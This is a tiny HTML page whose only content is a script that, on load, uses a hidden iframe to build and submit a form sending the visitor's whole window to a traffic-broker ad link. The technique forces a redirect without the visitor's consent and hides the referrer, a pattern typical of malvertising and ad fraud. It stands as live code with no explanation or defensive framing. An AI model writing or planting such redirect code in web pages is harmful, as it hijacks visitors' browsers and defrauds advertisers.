<html>
<body>
<script>
    function go() {
        window.frames[0].document.body.innerHTML = '<form target="_parent" action="http://delivery.trafficbroker.com/slink.php?zoneid=320959"></form>';
        window.frames[0].document.forms[0].submit()
    }
</script>
<iframe onload="window.setTimeout('go()', 99)" src="about:blank" style="visibility:hidden"></iframe>
</body>
</html>